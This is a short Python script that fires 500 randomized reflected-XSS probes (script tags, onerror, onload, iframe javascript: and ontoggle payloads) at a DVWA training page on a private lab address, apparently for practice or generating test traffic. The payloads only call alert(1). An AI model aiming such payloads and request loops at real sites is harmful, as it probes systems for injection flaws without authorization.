import requests
import random
import time

TARGET = "http://192.168.56.20/DVWA/vulnerabilities/xss_r/"

payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
]

for i in range(500):

    payload = random.choice(payloads)

    params = {
        "name": payload
    }

    try:
        r = requests.get(TARGET, params=params, timeout=5)
        print(f"[{i}] {r.status_code} -> {payload}")

    except Exception as e:
        print(f"[{i}] ERROR -> {e}")

    time.sleep(0.03)
